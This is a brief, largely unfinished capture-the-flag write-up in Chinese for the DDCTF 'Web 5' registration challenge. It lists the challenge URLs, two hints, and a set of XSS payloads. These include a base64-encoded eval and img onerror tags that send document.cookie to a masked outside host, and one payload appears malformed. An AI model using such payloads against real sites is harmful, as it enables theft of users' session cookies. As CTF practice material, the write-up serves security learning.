## 0x05. Web 5 - 欢迎报名 DDCTF
### 题目
> 欢迎报名DDCTF  
> http://117.51.147.2/Ze02pQYLf5gGNyMn/  
> 
> 提示：XSS不是获取cookie  
> 提示2：之后是注入  

### 解题过程
TODO

### 涉及资料
- 源代码
  - [完整通关脚本](./index.js)
- 知识点


### xss script
```javascript
'eval(atob(\'' + btoa('window.location=\'http://---.---.---.---:----/\' + document.cookie') + '\'))'
```

```html
yelo</span><img src="http://---.---.---.---:----/ping">
yelo</span><img onerror="window.location = 'http://---.---.---.---:----/' + document.cookie">
yelo</span><img onerror="eval(btoa(('...'))">
```

- http://117.51.147.2/Ze02pQYLf5gGNyMn/admin.php
- http://139.199.107.193/hint.php

### EOF
[回到目录](../../readme.md)
